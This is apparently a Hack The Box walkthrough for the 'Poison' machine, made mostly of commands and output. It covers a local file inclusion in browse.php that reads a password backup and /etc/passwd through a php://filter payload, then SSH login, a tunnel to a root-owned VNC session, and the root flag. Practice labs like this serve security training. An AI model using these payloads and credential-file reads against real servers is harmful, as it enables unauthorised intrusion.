# poison <br> <https://app.hackthebox.com/machines/Poison>

```bash
nmap -sC -sV 10.10.10.84                                       
Nmap scan report for 10.10.10.84
Host is up (0.080s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)
|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)
|_  256 0b8fd57185901385618beb34135f943b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```
```
http://10.10.10.84/browse.php

Warning: include(): Filename cannot be empty in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2
```

```
http://10.10.10.84/info.php

FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
```

```
http://10.10.10.84/browse.php?file=listfiles.php

Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```

```
http://10.10.10.84/browse.php?file=pwdbackup.txt

This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 

#Decoded 13 times
Charix!2#4%6&8(0
```

```
http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

IyAkRnJlZUJTRDogcmVsZW5nLzExLjEvZXRjL21hc3Rlci5wYXNzd2QgMjk5MzY1IDIwMTYtMDUtMTAgMTI6NDc6MzZaIGJjciAkCiMKcm9vdDoqOjA6MDpDaGFybGllICY6L3Jvb3Q6L2Jpbi9jc2gKdG9vcjoqOjA6MDpCb3VybmUtYWdhaW4gU3VwZXJ1c2VyOi9yb290OgpkYWVtb246KjoxOjE6T3duZXIgb2YgbWFueSBzeXN0ZW0gcHJvY2Vzc2VzOi9yb290Oi91c3Ivc2Jpbi9ub2xvZ2luCm9wZXJhdG9yOio6Mjo1OlN5c3RlbSAmOi86L3Vzci9zYmluL25vbG9naW4KYmluOio6Mzo3OkJpbmFyaWVzIENvbW1hbmRzIGFuZCBTb3VyY2U6LzovdXNyL3NiaW4vbm9sb2dpbgp0dHk6Kjo0OjY1NTMzOlR0eSBTYW5kYm94Oi86L3Vzci9zYmluL25vbG9naW4Ka21lbToqOjU6NjU1MzM6S01lbSBTYW5kYm94Oi86L3Vzci9zYmluL25vbG9naW4KZ2FtZXM6Kjo3OjEzOkdhbWVzIHBzZXVkby11c2VyOi86L3Vzci9zYmluL25vbG9naW4KbmV3czoqOjg6ODpOZXdzIFN1YnN5c3RlbTovOi91c3Ivc2Jpbi9ub2xvZ2luCm1hbjoqOjk6OTpNaXN0ZXIgTWFuIFBhZ2VzOi91c3Ivc2hhcmUvbWFuOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6KjoyMjoyMjpTZWN1cmUgU2hlbGwgRGFlbW9uOi92YXIvZW1wdHk6L3Vzci9zYmluL25vbG9naW4Kc21tc3A6KjoyNToyNTpTZW5kbWFpbCBTdWJtaXNzaW9uIFVzZXI6L3Zhci9zcG9vbC9jbGllbnRtcXVldWU6L3Vzci9zYmluL25vbG9naW4KbWFpbG51bGw6KjoyNjoyNjpTZW5kbWFpbCBEZWZhdWx0IFVzZXI6L3Zhci9zcG9vbC9tcXVldWU6L3Vzci9zYmluL25vbG9naW4KYmluZDoqOjUzOjUzOkJpbmQgU2FuZGJveDovOi91c3Ivc2Jpbi9ub2xvZ2luCnVuYm91bmQ6Kjo1OTo1OTpVbmJvdW5kIEROUyBSZXNvbHZlcjovdmFyL3VuYm91bmQ6L3Vzci9zYmluL25vbG9naW4KcHJveHk6Kjo2Mjo2MjpQYWNrZXQgRmlsdGVyIHBzZXVkby11c2VyOi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfcGZsb2dkOio6NjQ6NjQ6cGZsb2dkIHByaXZzZXAgdXNlcjovdmFyL2VtcHR5Oi91c3Ivc2Jpbi9ub2xvZ2luCl9kaGNwOio6NjU6NjU6ZGhjcCBwcm9ncmFtczovdmFyL2VtcHR5Oi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6Kjo2Njo2NjpVVUNQIHBzZXVkby11c2VyOi92YXIvc3Bvb2wvdXVjcHB1YmxpYzovdXNyL2xvY2FsL2xpYmV4ZWMvdXVjcC91dWNpY28KcG9wOio6Njg6NjpQb3N0IE9mZmljZSBPd25lcjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KYXVkaXRkaXN0ZDoqOjc4Ojc3OkF1ZGl0ZGlzdGQgdW5wcml2aWxlZ2VkIHVzZXI6L3Zhci9lbXB0eTovdXNyL3NiaW4vbm9sb2dpbgp3d3c6Kjo4MDo4MDpXb3JsZCBXaWRlIFdlYiBPd25lcjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX3lwbGRhcDoqOjE2MDoxNjA6WVAgTERBUCB1bnByaXZpbGVnZWQgdXNlcjovdmFyL2VtcHR5Oi91c3Ivc2Jpbi9ub2xvZ2luCmhhc3Q6Kjo4NDU6ODQ1OkhBU1QgdW5wcml2aWxlZ2VkIHVzZXI6L3Zhci9lbXB0eTovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6Kjo2NTUzNDo2NTUzNDpVbnByaXZpbGVnZWQgdXNlcjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX3RzczoqOjYwMTo2MDE6VHJvdVNlclMgdXNlcjovdmFyL2VtcHR5Oi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6Kjo1NTY6NTU2OkQtQlVTIERhZW1vbiBVc2VyOi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgphdmFoaToqOjU1ODo1NTg6QXZhaGkgRGFlbW9uIFVzZXI6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmN1cHM6KjoxOTM6MTkzOkN1cHMgT3duZXI6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmNoYXJpeDoqOjEwMDE6MTAwMTpjaGFyaXg6L2hvbWUvY2hhcml4Oi9iaW4vY3NoCg==

# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

```bash
ssh charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison: 
Charix!2#4%6&8(0
```

```bash
ps -aux | grep root
...
root    529  0.0  0.9  23620  8872 v0- I    19:45    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/
...
```

```bash
netstat -4AaLnT
Current listen queue sizes (qlen/incqlen/maxqlen)
Tcpcb            Proto Listen                           Local Address     
fffff80003ee2410 tcp4  0/0/10                           127.0.0.1.25       
fffff80003d0c000 tcp4  0/0/128                          *.80               
fffff80003d0c820 tcp4  0/0/128                          *.22               
fffff80003d0d410 tcp4  0/0/5                            127.0.0.1.5801     
fffff80003d0d820 tcp4  0/0/5                            127.0.0.1.5901   
```

```bash
ssh -L 5901:localhost:5901 charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison:
Charix!2#4%6&8(0
```

```bash
telnet localhost 5901       
Trying ::1...
Connected to localhost.
Escape character is '^]'.
```

```bash
vncviewer 127.0.0.1::5901 -passwd secret

cat /root/root.txt
716d04b188419cf2bb99d891272361f5
```
***References*** <br>
https://gchq.github.io/CyberChef/ <br>
https://superuser.com/questions/901970/using-clipboard-with-xfce-and-tightvnc
